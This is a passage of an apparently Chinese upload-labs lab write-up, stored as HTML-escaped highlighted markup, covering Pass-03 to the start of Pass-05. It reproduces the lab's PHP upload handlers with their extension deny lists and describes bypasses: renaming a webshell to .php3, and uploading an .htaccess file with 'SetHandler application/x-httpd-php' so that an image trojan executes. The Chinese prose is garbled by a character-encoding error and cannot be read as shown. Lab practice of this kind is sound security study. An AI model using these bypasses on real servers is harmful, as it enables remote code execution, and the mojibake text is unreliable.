&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//å»é™¤å­—ç¬¦ä¸²::$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//æ”¶å°¾å»ç©º
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;9999&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file,$img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ å‘ç°åªè¿‡æ»¤äº†&lt;code&gt;.aspã€.aspxã€.phpã€.jsp&lt;/code&gt;æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨&lt;code&gt;php3ã€phtmlã€phpsã€php5&lt;/code&gt;æ–‡ä»¶ç»•è¿‡è¿‡æ»¤ï¼Œå¹¶æ‰§è¡Œè¯­å¥ã€‚é€šå¸¸ï¼Œåœ¨åµŒå…¥äº†phpè„šæœ¬çš„htmlä¸­ï¼Œä½¿ç”¨ &lt;code&gt;phtml&lt;/code&gt;ä½œä¸ºåç¼€åï¼›è€Œphp3ï¼Œæˆ‘çš„ç†è§£æ˜¯phpä¹‹å‰ç‰ˆæœ¬çš„æ–‡ä»¶åç¼€ï¼Œå¦‚&lt;code&gt;php5&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ç›´æ¥æŠŠ&lt;code&gt;2333.php&lt;/code&gt;æ”¹ä¸º&lt;code&gt;2333.php3&lt;/code&gt;ä¸Šä¼ æ‰“å¼€ï¼Œæ‰§è¡ŒæˆåŠŸã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTq2cV.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-04"&gt;Pass-04
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php1&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;pHp1&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aScx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aShx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cEr&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.sWf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.swf&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//è½¬æ¢ä¸ºå°å†™
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//å»é™¤å­—ç¬¦ä¸²::$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//æ”¶å°¾å»ç©º
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ å¥½å®¶ä¼™ï¼Œè¿™æ¬¡ç›´æ¥ä¸€å¤§å †æ–‡ä»¶éƒ½è¢«è¿‡æ»¤äº†ï¼Œå‡ ä¹æœ‰é—®é¢˜çš„éƒ½åœ¨æ•°ç»„é‡Œã€‚å‘ç°æ²¡æœ‰.&lt;code&gt;htaccess&lt;/code&gt;æ–‡ä»¶è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸Šä¼ ä¸€ä¸ª.&lt;code&gt;htaccess&lt;/code&gt;æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ åŸç†çš„è¯æˆ‘è®²ä¸€ä¸‹ä¸ªäººçš„è§è§£ï¼š.&lt;code&gt;htaccess&lt;/code&gt;æ–‡ä»¶æ˜¯ä¸€ä¸ª&lt;code&gt;apache&lt;/code&gt;æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯å¯¹äºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½éœ€è¦ç¬¦åˆè¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚ç„¶åä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ä½œç”¨æ˜¯ï¼šæ‰€æœ‰æ–‡ä»¶è®¿é—®æ—¶éƒ½ä¼šè§£æä¸º&lt;code&gt;php&lt;/code&gt;ã€‚å‚è€ƒçš„åšå®¢ï¼š&lt;a class="link" href="https://www.cnblogs.com/gyrgyr/p/10773118.html" target="_blank" rel="noopener"
&gt;htaccessä½¿ç”¨æ–¹æ³•ä»‹ç»&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æ¥ä¸‹æ¥ä¸Šä¼ &lt;code&gt;2333.jpg&lt;/code&gt;å›¾ç‰‡æœ¨é©¬ï¼Œå†æ‰“å¼€å°±ä¼šè¢«æˆåŠŸè§£æä¸º&lt;code&gt;php&lt;/code&gt;æ–‡ä»¶å¹¶æ‰§è¡Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTqoN9.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTqqc6.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-05"&gt;Pass-05
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aScx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aShx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cEr&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.sWf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.swf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htaccess&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
